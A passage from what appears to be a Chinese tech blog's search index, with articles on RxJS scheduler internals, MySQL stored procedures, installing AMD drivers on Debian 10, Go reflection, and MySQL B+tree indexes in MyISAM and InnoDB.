the interval is not canceled. If the action doesn’t reschedule, or reschedules with a different delay, the interval will be canceled after scheduled callback execution. 对于某一个 Action 来说，除非它在调度的回调中被重新调度，那么它默认只会执行一次。这样的方式可以使得我们通过统一的代码实现调度单一或重复的 Actions，而无需添加 API，并且可以模仿传统递归来扩展异步。然而， JS 的运行时或者计时器分别通过串行的 setTimout 或者是单个 setInterval 来获取调用的定时器。串行的 setTimout 定时器可以单独延迟，这样做会延迟 c 下一个 setTimout 的调度，以此类推。而 setInterval 则不管程序运行的负载如何，它总是尝试去确保每一次定时器的回调更加精准的安排到合适的间隔时间。因此，我们使用 setInterval 来安排单一或重复的 Actions，如果 action 以相同的时延调度本身，那么当前定时器不会被取消。如果 action 只没有重新调度或者以不同的时延重新调度，则安排的回调执行后，改定时器会被取消。 12345678910class AsyncAction&lt;T&gt; extends Action&lt;T&gt; { protected requestAsyncId( scheduler: AsyncScheduler, id?: any, delay: number = 0 ): any { // 绑定 scheduler，并且把当前的 AsyncAction 当作参数传入。 return setInterval(scheduler.flush.bind(scheduler, this), delay); }} AsyncScheduler.flush所以，在 AsyncScheduler 中，新增的 flush 方法实际上是为 setInterval 服务的，它作为异步 API 的回调函数，主要步骤如下。 如果存在运行中的 Action ，它会保存所用调用它的 Action。 如果不存在运行中的 Action，它会执行所有调用队列中的 Action.execute 处理 Action.execute 的运行错误。 1234567891011121314151617181920212223242526272829303132export class AsyncScheduler extends Scheduler { public flush(action: AsyncAction&lt;any&gt;): void { const { actions } = this; if (this.active) { // 使用了一个队列保存所有输入的 Actions actions.push(action); return; } let error: any; this.active = true; // 默认 action 也是队列中的一员 // 将所有队列中的 Action 进行调用。 do { if ((error = action.execute(action.state, action.delay))) { break; } } while ((action = actions.shift())); this.active = false; // 出现错误时，取消所有未运行 action 的订阅 if (error) { // 注意，此处不会重复取消订阅，因为执行错误的Action会先退出队列，再执行循环。 while ((action = actions.shift())) { action.unsubscribe(); } throw error; } }} AsyncAction.execute上述的 flush 调用了 action 的 execute 方法。该方法也是通过处理 action 的内部状态来获得执行结果，其中会调用 _execute 这一内部方法，这个内部方法主要作用是调用 AsyncAction.work ，并处理它出现的异常。 12345678910111213141516171819202122232425262728293031class AsyncAction&lt;T&gt; extends Action&lt;T&gt; { public execute(state: T, delay: number): any { if (this.closed) { return new Error(&quot;executing a cancelled action&quot;); } this.pending = false; // 获取异常错误 const error = this._execute(state, delay); if (error) { return error; } else if (this.pending === false &amp;&amp; this.id != null) { this.id = this.recycleAsyncId(this.scheduler, this.id, null); } } protected _execute(state: T, delay: number): any { let errored: boolean = false; let errorValue: any = undefined; try { // work this.work(state); } catch (e) { errored = true; errorValue = (!!e &amp;&amp; e) || new Error(e); } if (errored) { this.unsubscribe(); return errorValue; } }} AsyncAction.recycleAsyncId在分析到 Action.schedule 的时候，引用了源码内部的注释，其中有一句话很重要，那就是 “如果 action 以相同的时延调度本身，那么当前定时器不会被取消”，所以 recycleAsyncId 这个方法是需要处理这种情况。 123456789101112131415class AsyncAction&lt;T&gt; extends Action&lt;T&gt; { protected recycleAsyncId( scheduler: AsyncScheduler, id: any, delay: number = 0 ): any { // this.delay === delay 处理了这种情况。 if (delay !== null &amp;&amp; this.delay === delay &amp;&amp; this.pending === false) { return id; } // 取消当前的定时器 clearInterval(id); return undefined; }} 运用 Template MethodAsyncScheduler 可以说已经把所有的地基都打好了，它可以直接拿来用，也可以继承并重写一些相关的接口把相应的异步 API 进行替换。 队列调度器队列调度器根据调用者传入的时延来决定使用同步方式的调度还是 setInterval 方式的调度。 QueueScheduler 单纯继承了 AsyncScheduler，其主要实现在 QueueAction 中，通过重写 schedule 、 execute 以及 requestAsyncId 等方法来实现这种功能。 123456789101112131415161718192021222324252627282930313233export class QueueAction&lt;T&gt; extends AsyncAction&lt;T&gt; { public schedule(state?: T, delay: number = 0): Subscription { // delay &gt; 0 ，执行异步调度 if (delay &gt; 0) { return super.schedule(state, delay); } this.delay = delay; this.state = state; // 否则直接执行同步调度 this.scheduler.flush(this); return this; } public execute(state: T, delay: number): any { // 根据传入的 delay 判断是否直接执行 work （同步执行） return delay &gt; 0 || this.closed ? super.execute(state, delay) : this._execute(state, delay); } protected requestAsyncId( scheduler: QueueScheduler, id?: any, delay: number = 0 ): any { // 根据传入的 delay 以及本身的 delay 来决定是否使用异步 if ((delay !== null &amp;&amp; delay &gt; 0) || (delay === null &amp;&amp; this.delay &gt; 0)) { return super.requestAsyncId(scheduler, id, delay); } // delay 为 0，直接同步调度 return scheduler.flush(this); }} 帧调度器 与 微任务调度器帧调度器根据调用者传入的时延来决定使用 requestAnimationFrame 还是 setInterval ，微任务调度器则是根据时延来决定使用 Promise.reslove().then() 还是 setInterval。 两者的调用类似，以至于可以结合起来分析。 Action它们的 action 方法均重写了 requestAsyncId 和 recycleAsyncId， 主要还是为了处理不同异步 API 。 12345678910111213141516171819202122232425262728293031323334protected requestAsyncId(scheduler: AnimationFrameScheduler, id?: any, delay: number = 0): any { if (delay !== null &amp;&amp; delay &gt; 0) { return super.requestAsyncId(scheduler, id, delay); } // 把当前action 加入到 actions 队列末端 scheduler.actions.push(this); if (!scheduler.scheduled) { // AsapAction 的情况 const scheduled = Immediate.setImmediate(scheduler.flush.bind(scheduler, null)); // AnimationFrameAction 的情况 const scheduled = requestAnimationFrame(scheduler.flush.bind(scheduler, null)); scheduler.scheduled = scheduled; } return scheduler.scheduled;}protected recycleAsyncId(scheduler: AnimationFrameScheduler, id?: any, delay: number = 0): any { if ((delay !== null &amp;&amp; delay &gt; 0) || (delay === null &amp;&amp; this.delay &gt; 0)) { return super.recycleAsyncId(scheduler, id, delay); } if (scheduler.actions.length === 0) { // AsapAction Immediate.clearImmediate(id); // AnimationFrameAction cancelAnimationFrame(id); scheduler.scheduled = undefined; } return undefined;} Scheduler它们的 flush，跟 AsyncScheduler 的 flush 实现思路差不多，依旧是轮询 actions 队列调用 action.execute ，只是它们的 flush 需要去处理额外的以下细节。 action 传入可能为空。 处理 actions 的状态。 清空 scheduled，使得 scheduler 能够进行下一次调度。 1234567891011121314151617181920212223242526272829// export class AnimationFrameScheduler extends AsyncScheduler {export class AsapScheduler extends AsyncScheduler { public flush(action?: AsyncAction&lt;any&gt;): void { this.active = true; this.scheduled = undefined; const { actions } = this; let error: any; let index: number = -1; // 此处顺序不能打乱，因为这样 action = action || actions.shift()!; let count: number = actions.length; do { if ((error = action.execute(action.state, action.delay))) { break; } } while (++index &lt; count &amp;&amp; (action = actions.shift())); this.active = false; if (error) { while (++index &lt; count &amp;&amp; (action = actions.shift())) { action.unsubscribe(); } throw error; } }} Immediate这里很有意思的一点， AsapScheduler 并没有直接通过 Promise.reslove().then() 来实现。而是把它封装成 Immediate，形成 setImmediate 和 clearImmediate 两个 API ，这样就使得微任务的调用其他的定时 API 无异。 内部实现是通过一个 Map 保存标记当前的是第几个微任务，这里并不直接保存 Promise，因为 Promise 执行完毕后就自行释放了，所以它需要的只是一个标记。 123456789101112131415161718192021222324let nextHandle = 1;const RESOLVED = (() =&gt; Promise.resolve())();const activeHandles: { [key: number]: any } = {};function findAndClearHandle(handle: number): boolean { if (handle in activeHandles) { delete activeHandles[handle]; return true; } return false;}export const Immediate = { setImmediate(cb: () =&gt; void): number { const handle = nextHandle++; activeHandles[handle] = true; RESOLVED.then(() =&gt; findAndClearHandle(handle) &amp;&amp; cb()); return handle; }, clearImmediate(handle: number): void { findAndClearHandle(handle); },}; 总结本篇分析了 RxJS 的调度器相关的一系列内容，通过封装 JS 异步 API ，调度器实现相对应的异步功能，增强了 RxJS 对异步 IO 的掌控。","link":"/front-end/angular_rxjs_6/"},{"title":"MySQL 创建存储过程与函数","text":"存储过程1234CREATE [DEFINER = user] PROCEDURE sp_name ([proc_parameter[,...]]) [characteristic ...] routine_body proc_parameter [ IN | OUT | INOUT ] 参数名 参数类型 routine_body 函数体 示例 12345CREATE PROCEDURE citycount (IN country CHAR(3), OUT cities INT)BEGIN SELECT COUNT(*) INTO cities FROM world.city WHERE CountryCode = country;END 函数12345CREATE [DEFINER = user] FUNCTION sp_name ([func_parameter[,...]]) RETURNS type [characteristic ...] routine_body func_parameter 参数名 参数类型 type 返回值累心 routine_body 函数体 示例 123CREATE FUNCTION hello (s CHAR(20))RETURNS CHAR(50) DETERMINISTICRETURN CONCAT('Hello, ',s,'!'); Characteristic1234567characteristic: { COMMENT 'string' | LANGUAGE SQL | [NOT] DETERMINISTIC | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER }}","link":"/database/mysql_procedure_and_function/"},{"title":"Debian 10 安装 AMD 显卡驱动","text":"启用 Non-Free 存储库 12345deb http://deb.debian.org/debian/ buster main non-free contribdeb-src http://deb.debian.org/debian/ buster main non-free contribdeb http://security.debian.org/debian-security buster/updates main contrib non-freedeb-src http://security.debian.org/debian-security buster/updates main contrib non-free 更新源 1apt update 安装 AMD 驱动程序 1apt install firmware-linux firmware-linux-nonfree libdrm-amdgpu1 xserver-xorg-video-amdgpu 安装 Vulkan 1apt install mesa-vulkan-drivers libvulkan1 vulkan-tools vulkan-utils vulkan-validationlayers 安装 OpenCL 1apt install mesa-opencl-icd","link":"/ops/debian_amd/"},{"title":"Golang的反射reflect深入理解","text":"在计算机科学领域，反射是指一类应用，它们能够自描述和自控制。也就是说，这类应用通过采用某种机制来实现对自己行为的描述（self-representation）和监测（examination），并能根据自身行为的状态和结果，调整或修改应用所描述行为的状态和相关的语义。 每种语言的反射模型都不同，并且有些语言根本不支持反射。Golang 语言实现了反射，反射机制就是在运行时动态的调用对象的方法和属性，官方自带的 reflect 包就是反射相关的，只要包含这个包就可以使用。 多插一句，Golang 的 gRPC 也是通过反射实现的。 作者：吴德宝 AllenWu链接：https://juejin.cn/post/6844903559335526407 interface 和 反射在讲反射之前，先来看看 Golang 关于类型设计的一些原则 变量包括（type, value）两部分 理解这一点就知道为什么 nil != nil 了 type 包括 static type 和 concrete type. 简单来说 static type 是你在编码是看见的类型(如 int、string)，concrete type 是 runtime 系统看见的类型 类型断言能否成功，取决于变量的 concrete type，而不是 static type. 因此，一个 reader 变量如果它的 concrete type 也实现了 write 方法的话，它也可以被类型断言为 writer. 接下来要讲的反射，就是建立在类型之上的，Golang 的指定类型的变量的类型是静态的（也就是指定 int、string 这些的变量，它的 type 是 static type），在创建变量的时候就已经确定，反射主要与 Golang 的 interface 类型相关（它的 type 是 concrete type），只有 interface 类型才有反射一说。 在 Golang 的实现中，每个 interface 变量都有一个对应 pair，pair 中记录了实际变量的值和类型: 1(value, type) value 是实际变量值，type 是实际变量的类型。一个 interface{} 类型的变量包含了 2 个指针，一个指针指向值的类型【对应 concrete type】，另外一个指针指向实际的值【对应 value】。 例如，创建类型为 *os.File 的变量，然后将其赋给一个接口变量 r： 1234tty, err := os.OpenFile(&quot;/dev/tty&quot;, os.O_RDWR, 0)var r io.Readerr = tty 接口变量 r 的 pair 中将记录如下信息：(tty, *os.File)，这个 pair 在接口变量的连续赋值过程中是不变的，将接口变量 r 赋给另一个接口变量 w: 12var w io.Writerw = r.(io.Writer) 接口变量 w 的 pair 与 r 的 pair 相同，都是:(tty, *os.File)，即使 w 是空接口类型，pair 也是不变的。 interface 及其 pair 的存在，是 Golang 中实现反射的前提，理解了 pair，就更容易理解反射。反射就是用来检测存储在接口变量内部(值 value；类型 concrete type) pair 对的一种机制。 Golang 的反射 reflectreflect 的基本功能 TypeOf 和 ValueOf既然反射就是用来检测存储在接口变量内部(值 value；类型 concrete type) pair 对的一种机制。那么在 Golang 的 reflect 反射包中有什么样的方式可以让我们直接获取到变量内部的信息呢？ 它提供了两种类型（或者说两个方法）让我们可以很容易的访问接口变量内容，分别是 reflect.ValueOf() 和 reflect.TypeOf()，看看官方的解释 123456789101112// ValueOf returns a new Value initialized to the concrete value// stored in the interface i. ValueOf(nil) returns the zerofunc ValueOf(i interface{}) Value {...}// 翻译一下：ValueOf 用来获取输入参数接口中的数据的值，如果接口为空则返回0// TypeOf returns the reflection Type that represents the dynamic type of i.// If i is a nil interface value, TypeOf returns nil.func TypeOf(i interface{}) Type {...}// 翻译一下：TypeOf 用来动态获取输入参数接口中的值的类型，如果接口为空则返回nil reflect.TypeOf() 是获取 pair 中的 type，reflect.ValueOf() 获取 pair 中的 value，示例如下： 1234567891011121314151617package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)func main() { var num float64 = 1.2345 fmt.Println(&quot;type: &quot;, reflect.TypeOf(num)) fmt.Println(&quot;value: &quot;, reflect.ValueOf(num))}// 运行结果:// type: float64// value: 1.2345 说明 reflect.TypeOf： 直接给到了我们想要的 type 类型，如 float64、int、各种 pointer、struct 等等真实的类型 reflect.ValueOf：直接给到了我们想要的具体的值，如 1.2345 这个具体数值，或者类似&amp;{1 “Allen.Wu” 25} 这样的结构体 struct 的值 也就是说明反射可以将“接口类型变量”转换为“反射类型对象”，反射类型指的是 reflect.Type 和 reflect.Value 这两种 从 relfect.Value 中获取接口 interface 的信息当执行 reflect.ValueOf(interface) 之后，就得到了一个类型为”relfect.Value”变量，可以通过它本身的 Interface()方法获得接口变量的真实内容，然后可以通过类型判断进行转换，转换为原有真实类型。不过，我们可能是已知原有类型，也有可能是未知原有类型，因此，下面分两种情况进行说明。 已知原有类型【进行“强制转换”】已知类型后转换为其对应的类型的做法如下，直接通过 Interface 方法然后强制转换，如下： 1realValue := value.Interface().(已知的类型) 示例如下： 1234567891011121314151617181920212223242526package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)func main() { var num float64 = 1.2345 pointer := reflect.ValueOf(&amp;num) value := reflect.ValueOf(num) // 可以理解为“强制转换”，但是需要注意的时候，转换的时候，如果转换的类型不完全符合，则直接panic // Golang 对类型要求非常严格，类型一定要完全符合 // 如下两个，一个是*float64，一个是float64，如果弄混，则会panic convertPointer := pointer.Interface().(*float64) convertValue := value.Interface().(float64) fmt.Println(convertPointer) fmt.Println(convertValue)}// 运行结果：// 0xc42000e238// 1.2345 说明 转换的时候，如果转换的类型不完全符合，则直接 panic，类型要求非常严格！ 转换的时候，要区分是指针还是值 也就是说反射可以将“反射类型对象”再重新转换为“接口类型变量” 未知原有类型【遍历探测其 Filed】很多情况下，我们可能并不知道其具体类型，那么这个时候，该如何做呢？需要我们进行遍历探测其 Filed 来得知，示例如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)type User struct { Id int Name string Age int}func (u User) ReflectCallFunc() { fmt.Println(&quot;Allen.Wu ReflectCallFunc&quot;)}func main() { user := User{1, &quot;Allen.Wu&quot;, 25} DoFiledAndMethod(user)}// 通过接口来获取任意参数，然后一一揭晓func DoFiledAndMethod(input interface{}) { getType := reflect.TypeOf(input) fmt.Println(&quot;get Type is :&quot;, getType.Name()) getValue := reflect.ValueOf(input) fmt.Println(&quot;get all Fields is:&quot;, getValue) // 获取方法字段 // 1. 先获取interface的reflect.Type，然后通过NumField进行遍历 // 2. 再通过reflect.Type的Field获取其Field // 3. 最后通过Field的Interface()得到对应的value for i := 0; i &lt; getType.NumField(); i++ { field := getType.Field(i) value := getValue.Field(i).Interface() fmt.Printf(&quot;%s: %v = %v\\n&quot;, field.Name, field.Type, value) } // 获取方法 // 1. 先获取interface的reflect.Type，然后通过.NumMethod进行遍历 for i := 0; i &lt; getType.NumMethod(); i++ { m := getType.Method(i) fmt.Printf(&quot;%s: %v\\n&quot;, m.Name, m.Type) }}// 运行结果：// get Type is : User// get all Fields is: {1 Allen.Wu 25}// Id: int = 1// Name: string = Allen.Wu// Age: int = 25// ReflectCallFunc: func(main.User) 说明 通过运行结果可以得知获取未知类型的 interface 的具体变量及其类型的步骤为： 先获取 interface 的 reflect.Type，然后通过 NumField 进行遍历 再通过 reflect.Type 的 Field 获取其 Field 最后通过 Field 的 Interface()得到对应的 value 通过运行结果可以得知获取未知类型的 interface 的所属方法（函数）的步骤为： 先获取 interface 的 reflect.Type，然后通过 NumMethod 进行遍历 再分别通过 reflect.Type 的 Method 获取对应的真实的方法（函数） 最后对结果取其 Name 和 Type 得知具体的方法名 也就是说反射可以将“反射类型对象”再重新转换为“接口类型变量” struct 或者 struct 的嵌套都是一样的判断处理方式 通过 reflect.Value 设置实际变量的值reflect.Value 是通过 reflect.ValueOf(X) 获得的，只有当 X 是指针的时候，才可以通过 reflec.Value 修改实际变量 X 的值，即：要修改反射类型的对象就一定要保证其值是“addressable”的。 示例如下： 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)func main() { var num float64 = 1.2345 fmt.Println(&quot;old value of pointer:&quot;, num) // 通过reflect.ValueOf获取num中的reflect.Value，注意，参数必须是指针才能修改其值 pointer := reflect.ValueOf(&amp;num) newValue := pointer.Elem() fmt.Println(&quot;type of pointer:&quot;, newValue.Type()) fmt.Println(&quot;settability of pointer:&quot;, newValue.CanSet()) // 重新赋值 newValue.SetFloat(77) fmt.Println(&quot;new value of pointer:&quot;, num) //////////////////// // 如果reflect.ValueOf的参数不是指针，会如何？ pointer = reflect.ValueOf(num) //newValue = pointer.Elem() // 如果非指针，这里直接panic，“panic: reflect: call of reflect.Value.Elem on float64 Value”}// 运行结果：// old value of pointer: 1.2345// type of pointer: float64// settability of pointer: true// new value of pointer: 77 说明 需要传入的参数是 *float64 这个指针，然后可以通过 pointer.Elem()去获取所指向的 Value，注意一定要是指针。 如果传入的参数不是指针，而是变量，那么 通过 Elem 获取原始值对应的对象则直接 panic 通过 CanSet 方法查询是否可以设置返回 false newValue.CantSet()表示是否可以重新设置其值，如果输出的是 true 则可修改，否则不能修改，修改完之后再进行打印发现真的已经修改了。 reflect.Value.Elem() 表示获取原始值对应的反射对象，只有原始对象才能修改，当前反射对象是不能修改的 也就是说如果要修改反射类型对象，其值必须是“addressable”【对应的要传入的是指针，同时要通过 Elem 方法获取原始值对应的反射对象】 struct 或者 struct 的嵌套都是一样的判断处理方式 通过 reflect.ValueOf 来进行方法的调用这算是一个高级用法了，前面我们只说到对类型、变量的几种反射的用法，包括如何获取其值、其类型、如果重新设置新值。但是在工程应用中，另外一个常用并且属于高级的用法，就是通过 reflect 来进行方法【函数】的调用。比如我们要做框架工程的时候，需要可以随意扩展方法，或者说用户可以自定义方法，那么我们通过什么手段来扩展让用户能够自定义呢？关键点在于用户的自定义方法是未可知的，因此我们可以通过 reflect 来搞定 示例如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( &quot;fmt&quot; &quot;reflect&quot;)type User struct { Id int Name string Age int}func (u User) ReflectCallFuncHasArgs(name string, age int) { fmt.Println(&quot;ReflectCallFuncHasArgs name: &quot;, name, &quot;, age:&quot;, age, &quot;and origal User.Name:&quot;, u.Name)}func (u User) ReflectCallFuncNoArgs() { fmt.Println(&quot;ReflectCallFuncNoArgs&quot;)}// 如何通过反射来进行方法的调用？// 本来可以用u.ReflectCallFuncXXX直接调用的，但是如果要通过反射，那么首先要将方法注册，也就是MethodByName，然后通过反射调动mv.Callfunc main() { user := User{1, &quot;Allen.Wu&quot;, 25} // 1. 要通过反射来调用起对应的方法，必须要先通过reflect.ValueOf(interface)来获取到reflect.Value，得到“反射类型对象”后才能做下一步处理 getValue := reflect.ValueOf(user) // 一定要指定参数为正确的方法名 // 2. 先看看带有参数的调用方法 methodValue := getValue.MethodByName(&quot;ReflectCallFuncHasArgs&quot;) args := []reflect.Value{reflect.ValueOf(&quot;wudebao&quot;), reflect.ValueOf(30)} methodValue.Call(args) // 一定要指定参数为正确的方法名 // 3. 再看看无参数的调用方法 methodValue = getValue.MethodByName(&quot;ReflectCallFuncNoArgs&quot;) args = make([]reflect.Value, 0) methodValue.Call(args)}// 运行结果：// ReflectCallFuncHasArgs name: wudebao , age: 30 and origal User.Name: Allen.Wu// ReflectCallFuncNoArgs 说明 要通过反射来调用起对应的方法，必须要先通过 reflect.ValueOf(interface)来获取到 reflect.Value，得到“反射类型对象”后才能做下一步处理 reflect.Value.MethodByName 这.MethodByName，需要指定准确真实的方法名字，如果错误将直接 panic，MethodByName 返回一个函数值对应的 reflect.Value 方法的名字。 []reflect.Value，这个是最终需要调用的方法的参数，可以没有或者一个或者多个，根据实际参数来定。 reflect.Value 的 Call 这个方法，这个方法将最终调用真实的方法，参数务必保持一致，如果 reflect.Value’Kind 不是一个方法，那么将直接 panic。 本来可以用 u.ReflectCallFuncXXX 直接调用的，但是如果要通过反射，那么首先要将方法注册，也就是 MethodByName，然后通过反射调用 methodValue.Call Golang 的反射 reflect 性能Golang 的反射很慢，这个和它的 API 设计有关。在 java 里面，我们一般使用反射都是这样来弄的。 123Field field = clazz.getField(&quot;hello&quot;);field.get(obj1);field.get(obj2); 这个取得的反射对象类型是 java.lang.reflect.Field。它是可以复用的。只要传入不同的 obj，就可以取得这个 obj 上对应的 field。 但是 Golang 的反射不是这样设计的: 12type_ := reflect.TypeOf(obj)field, _ := type_.FieldByName(&quot;hello&quot;) 这里取出来的 field 对象是 reflect.StructField 类型，但是它没有办法用来取得对应对象上的值。如果要取值，得用另外一套对 object，而不是 type 的反射 12type_ := reflect.ValueOf(obj)fieldValue := type_.FieldByName(&quot;hello&quot;) 这里取出来的 fieldValue 类型是 reflect.Value，它是一个具体的值，而不是一个可复用的反射对象了，每次反射都需要 malloc 这个 reflect.Value 结构体，并且还涉及到 GC。 小结 Golang reflect 慢主要有两个原因 涉及到内存分配以及后续的 GC； reflect 实现里面有大量的枚举，也就是 for 循环，比如类型之类的。 总结上述详细说明了 Golang 的反射 reflect 的各种功能和用法，都附带有相应的示例，相信能够在工程应用中进行相应实践，总结一下就是： 反射可以大大提高程序的灵活性，使得 interface{}有更大的发挥余地 反射必须结合 interface 才玩得转 变量的 type 要是 concrete type 的（也就是 interface 变量）才有反射一说 反射可以将“接口类型变量”转换为“反射类型对象” 反射使用 TypeOf 和 ValueOf 函数从接口中获取目标对象信息 反射可以将“反射类型对象”转换为“接口类型变量 reflect.value.Interface().(已知的类型) 遍历 reflect.Type 的 Field 获取其 Field 反射可以修改反射类型对象，但是其值必须是“addressable” 想要利用反射修改对象状态，前提是 interface.data 是 settable,即 pointer-interface 通过反射可以“动态”调用方法 因为 Golang 本身不支持模板，因此在以往需要使用模板的场景下往往就需要使用反射(reflect)来实现","link":"/backend/go_reflect/"},{"title":"MySQL 索引","text":"MySQL 支持诸多存储引擎，而各种存储引擎对索引的支持也各不相同，因此 MySQL 数据库支持多种索引类型，如 BTree 索引，哈希索引，全文索引等等。为了避免混乱，本文将只关注于 BTree 索引，因为这是平常使用 MySQL 时主要打交道的索引。 MySQL 官方对索引的定义为：索引（Index）是帮助 MySQL 高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。 作者：吴德宝 AllenWu链接：https://juejin.cn/post/6844903555141206030 MySQL 索引原理索引目的索引的目的在于提高查询效率，可以类比字典，如果要查“mysql”这个单词，我们肯定需要定位到 m 字母，然后从下往下找到 y 字母，再找到剩下的 sql。如果没有索引，那么你可能需要把所有单词看一遍才能找到你想要的，如果我想找到 m 开头的单词呢？或者 ze 开头的单词呢？是不是觉得如果没有索引，这个事情根本无法完成？ 咱们去图书馆借书也是一样，如果你要借某一本书，一定是先找到对应的分类科目，再找到对应的编号，这是生活中活生生的例子，通用索引，可以加快查询速度，快速定位。 索引原理所有索引原理都是一样的，通过不断的缩小想要获得数据的范围来筛选出最终想要的结果，同时把随机的事件变成顺序的事件，也就是我们总是通过同一种查找方式来锁定数据。 数据库也是一样，但显然要复杂许多，因为不仅面临着等值查询，还有范围查询(&gt;、&lt;、between)、模糊查询(like)、并集查询(or)、多值匹配（in【in 本质上属于多个 or】）等等。数据库应该选择怎么样的方式来应对所有的问题呢？我们回想字典的例子，能不能把数据分成段，然后分段查询呢？最简单的如果 1000 条数据，1 到 100 分成第一段，101 到 200 分成第二段，201 到 300 分成第三段……这样查第 250 条数据，只要找第三段就可以了，一下子去除了 90%的无效数据。但如果是 1 千万的记录呢，分成几段比较好？稍有算法基础的同学会想到搜索树，其平均复杂度是 lgN，具有不错的查询性能。但这里我们忽略了一个关键的问题，复杂度模型是基于每次相同的操作成本来考虑的，数据库实现比较复杂，数据保存在磁盘上，而为了提高性能，每次又可以把部分数据读入内存来计算，因为我们知道访问磁盘的成本大概是访问内存的十万倍左右，所以简单的搜索树难以满足复杂的应用场景。 索引结构任何一种数据结构都不是凭空产生的，一定会有它的背景和使用场景，我们现在总结一下，我们需要这种数据结构能够做些什么，其实很简单，那就是：每次查找数据时把磁盘 IO 次数控制在一个很小的数量级，最好是常数数量级。那么我们就想到如果一个高度可控的多路搜索树是否能满足需求呢？就这样，b+树应运而生。 b+树的索引结构解释 浅蓝色的块我们称之为一个磁盘块，可以看到每个磁盘块包含几个数据项（深蓝色所示）和指针（黄色所示），如磁盘块 1 包含数据项 17 和 35，包含指针 P1、P2、P3，P1 表示小于 17 的磁盘块，P2 表示在 17 和 35 之间的磁盘块，P3 表示大于 35 的磁盘块。真实的数据存在于叶子节点即 3、5、9、10、13、15、28、29、36、60、75、79、90、99。非叶子节点不存储真实的数据，只存储指引搜索方向的数据项，如 17、35 并不真实存在于数据表中。 b+树的查找过程 如图所示，如果要查找数据项 29，那么首先会把磁盘块 1 由磁盘加载到内存，此时发生一次 IO，在内存中用二分查找确定 29 在 17 和 35 之间，锁定磁盘块 1 的 P2 指针，内存时间因为非常短（相比磁盘的 IO）可以忽略不计，通过磁盘块 1 的 P2 指针的磁盘地址把磁盘块 3 由磁盘加载到内存，发生第二次 IO，29 在 26 和 30 之间，锁定磁盘块 3 的 P2 指针，通过指针加载磁盘块 8 到内存，发生第三次 IO，同时内存中做二分查找找到 29，结束查询，总计三次 IO。真实的情况是，3 层的 b+树可以表示上百万的数据，如果上百万的数据查找只需要三次 IO，性能提高将是巨大的，如果没有索引，每个数据项都要发生一次 IO，那么总共需要百万次的 IO，显然成本非常非常高。 b+树性质 通过上面的分析，我们知道间越小，数据项的数量越多，树的高度越低。这就是为什么每个数据项，即索引字段要尽量的小，比如 int 占 4 字节，要比 bigint8 字节少一半。这也是为什么 b+树要求把真实的数据放到叶子节点而不是内层节点，一旦放到内层节点，磁盘块的数据项会大幅度下降，导致树增高。当数据项等于 1 时将会退化成线性表。 当 b+树的数据项是复合的数据结构，比如(name,age,sex)的时候，b+数是按照从左到右的顺序来建立搜索树的，比如当(张三,20,F)这样的数据来检索的时候，b+树会优先比较 name 来确定下一步的所搜方向，如果 name 相同再依次比较 age 和 sex，最后得到检索的数据；但当(20,F)这样的没有 name 的数据来的时候，b+树就不知道下一步该查哪个节点，因为建立搜索树的时候 name 就是第一个比较因子，必须要先根据 name 来搜索才能知道下一步去哪里查询。比如当(张三,F)这样的数据来检索时，b+树可以用 name 来指定搜索方向，但下一个字段 age 的缺失，所以只能把名字等于张三的数据都找到，然后再匹配性别是 F 的数据了， 这个是非常重要的性质，即索引的最左匹配特性。 MySQL 索引实现在 MySQL 中，索引属于存储引擎级别的概念，不同存储引擎对索引的实现方式是不同的，本文主要讨论 MyISAM 和 InnoDB 两个存储引擎的索引实现方式。 MyISAM 索引实现MyISAM 引擎使用 B+Tree 作为索引结构，叶节点的 data 域存放的是数据记录的地址。 下图是 MyISAM 索引的原理图： 这里设表一共有三列，假设我们以 Col1 为主键，则上图便是一个 MyISAM 表的主索引（Primary key）示意图。可以看出 MyISAM 的索引文件仅仅保存数据记录的地址。在 MyISAM 中，主索引和辅助索引（Secondary key）在结构上没有任何区别，只是主索引要求 key 是唯一的，而辅助索引的 key 可以重复。如果我们在 Col2 上建立一个辅助索引，则此索引的结构如下图所示： 同样也是一颗 B+Tree，data 域保存数据记录的地址。因此，MyISAM 中索引检索的算法为首先按照 B+Tree 搜索算法搜索索引，如果指定的 Key 存在，则取出其 data 域的值，然后以 data 域的值为地址，读取相应数据记录。 MyISAM 的索引方式也叫做“非聚集”的，之所以这么称呼是为了与 InnoDB 的聚集索引区分。 InnoDB 索引实现虽然 InnoDB 也使用 B+Tree 作为索引结构，但具体实现方式却与 MyISAM 截然不同。 第一个重大区别是 InnoDB 的数据文件本身就是索引文件。从上文知道，MyISAM 索引文件和数据文件是分离的，索引文件仅保存数据记录的地址。而在 InnoDB 中，表数据文件本身就是按 B+Tree 组织的一个索引结构，这棵树的叶节点 data 域保存了完整的数据记录。这个索引的 key 是数据表的主键，因此 InnoDB 表数据文件本身就是主索引。 上图是 InnoDB 主索引（同时也是数据文件）的示意图，可以看到叶节点包含了完整的数据记录。这种索引叫做聚集索引。因为 InnoDB 的数据文件本身要按主键聚集，所以 InnoDB 要求表必须有主键（MyISAM 可以没有），如果没有显式指定，则 MySQL 系统会自动选择一个可以唯一标识数据记录的列作为主键，如果不存在这种列，则 MySQL 自动为 InnoDB 表生成一个隐含字段作为主键，这个字段长度为 6 个字节，类型为长整形。 第二个与 MyISAM 索引的不同是 InnoDB 的辅助索引 data 域存储相应记录主键的值而不是地址。换句话说，InnoDB 的所有辅助索引都引用主键作为 data 域。例如，下图为定义在 Col3 上的一个辅助索引： 这里以英文字符的 ASCII 码作为比较准则。聚集索引这种实现方式使得按主键的搜索十分高效，但是辅助索引搜索需要检索两遍索引：首先检索辅助索引获得主键，然后用主键到主索引中检索获得记录。 了解不同存储引擎的索引实现方式对于正确使用和优化索引都非常有帮助，例如知道了 InnoDB 的索引实现后，就很容易明白为什么不建议使用过长的字段作为主键，因为所有辅助索引都引用主索引，过长的主索引会令辅助索引变得过大。再例如，用非单调的字段作为主键在 InnoDB 中不是个好主意，因为 InnoDB 数据文件本身是一颗 B+Tree，非单调的主键会造成在插入新记录时数据文件为了维持 B+Tree 